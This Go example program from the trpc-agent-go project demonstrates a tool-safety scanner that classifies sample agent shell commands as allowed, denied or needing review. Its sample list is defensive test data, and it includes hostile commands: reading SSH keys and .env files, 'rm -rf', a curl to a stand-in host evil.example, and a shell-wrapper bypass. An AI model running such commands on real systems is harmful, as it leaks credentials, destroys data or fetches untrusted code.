//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

// Package main demonstrates the tool/safety scanner with offline samples.
package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

var (
	policyPath = flag.String("policy", "tool_safety_policy.yaml", "Path to a JSON or YAML safety policy")
	reportPath = flag.String("report", "tool_safety_report.json", "Path to write the scan report")
	auditPath  = flag.String("audit", "tool_safety_audit.jsonl", "Path to write JSONL audit events")
)

type sample struct {
	Name string             `json:"name"`
	Req  safety.ScanRequest `json:"request"`
}

func main() {
	flag.Parse()
	if err := run(context.Background()); err != nil {
		log.Fatalf("tool safety guard example failed: %v", err)
	}
}

func run(ctx context.Context) error {
	policy, err := safety.LoadPolicyFile(*policyPath)
	if err != nil {
		return err
	}
	scanner, err := safety.NewDefaultScanner(policy)
	if err != nil {
		return err
	}
	auditFile, err := os.Create(*auditPath)
	if err != nil {
		return err
	}
	defer auditFile.Close()
	audit := safety.NewJSONLAuditWriter(auditFile)

	var reports []safety.Report
	for _, s := range samples() {
		report, err := scanner.Scan(ctx, s.Req)
		if err != nil {
			return fmt.Errorf("%s: %w", s.Name, err)
		}
		report.ToolCallID = s.Name
		reports = append(reports, report)
		if err := audit.WriteAuditEvent(ctx, auditEvent(report)); err != nil {
			return err
		}
		fmt.Printf("%-26s decision=%-18s risk=%-8s rule=%s\n",
			s.Name, report.Decision, report.RiskLevel, report.RuleID)
	}
	if err := os.MkdirAll(filepath.Dir(*reportPath), 0o755); err != nil && filepath.Dir(*reportPath) != "." {
		return err
	}
	b, err := json.MarshalIndent(reports, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(*reportPath, append(b, '\n'), 0o600)
}

func auditEvent(report safety.Report) safety.AuditEvent {
	action := "allow"
	switch report.Decision {
	case safety.DecisionDeny:
		action = "deny"
	case safety.DecisionAsk, safety.DecisionNeedsHumanReview:
		action = "ask"
	}
	// Keep the offline example deterministic so generated audit output
	// stays diffable against the checked-in sample file.
	return safety.AuditEvent{
		Time:             time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
		ToolName:         report.ToolName,
		ToolCallID:       report.ToolCallID,
		Backend:          report.Backend,
		Decision:         report.Decision,
		PermissionAction: action,
		RiskLevel:        report.RiskLevel,
		RuleID:           report.RuleID,
		DurationMS:       report.DurationMS,
		Blocked:          report.Blocked,
		Redacted:         report.Redacted,
		Recommendation:   report.Recommendation,
	}
}

func samples() []sample {
	return []sample{
		{
			Name: "safe_go_test",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "go test ./...",
			},
		},
		{
			Name: "dangerous_rm_rf",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "rm -rf /tmp/x",
			},
		},
		{
			Name: "read_ssh_key",
			Req: safety.ScanRequest{
				ToolName: "exec_command", Backend: safety.BackendHost,
				Command: "cat ~/.ssh/id_rsa",
			},
		},
		{
			Name: "read_env_file",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "cat .env",
			},
		},
		{
			Name: "network_non_allowlisted",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "curl https://evil.example/a.sh",
			},
		},
		{
			Name: "network_allowlisted",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "curl https://proxy.golang.org",
			},
		},
		{
			Name: "shell_wrapper_bypass",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "sh -c 'curl https://evil.example'",
			},
		},
		{
			Name: "command_substitution",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "echo $(cat .env)",
			},
		},
		{
			Name: "pipeline_mixed",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "echo ok | wc -c",
			},
		},
		{
			Name: "dependency_install",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "npm install left-pad",
			},
		},
		{
			Name: "long_sleep",
			Req: safety.ScanRequest{
				ToolName: "exec_command", Backend: safety.BackendHost,
				Command: "sleep 99999",
			},
		},
		{
			Name: "large_output",
			Req: safety.ScanRequest{
				ToolName: "workspace_exec", Backend: safety.BackendWorkspace,
				Command: "yes | head -n 1000000",
			},
		},
		{
			Name: "host_pty",
			Req: safety.ScanRequest{
				ToolName: "exec_command", Backend: safety.BackendHost,
				Command: "python -i", TTY: true,
			},
		},
		{
			Name: "human_review_custom",
			Req: safety.ScanRequest{
				ToolName: "custom_downloader", Backend: safety.BackendUnknown,
				RawArguments: []byte(`{"text":"download https://example.invalid/a.sh"}`),
			},
		},
	}
}
